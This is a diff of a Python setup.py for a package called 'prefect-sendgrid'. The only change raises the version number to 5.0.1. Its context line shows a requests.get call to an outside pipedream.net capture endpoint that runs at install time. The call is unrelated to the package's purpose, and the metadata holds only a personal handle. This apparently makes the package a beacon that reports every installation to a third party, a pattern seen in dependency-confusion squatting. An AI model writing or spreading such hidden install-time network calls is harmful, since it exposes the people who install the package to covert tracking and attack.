@@ -6,7 +6,7 @@ x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
 setup(name='prefect-sendgrid',
-      version='3.0.1',
+      version='5.0.1',
       description='AnupamAS01',
       author='AnupamAS01',
       license='MIT',
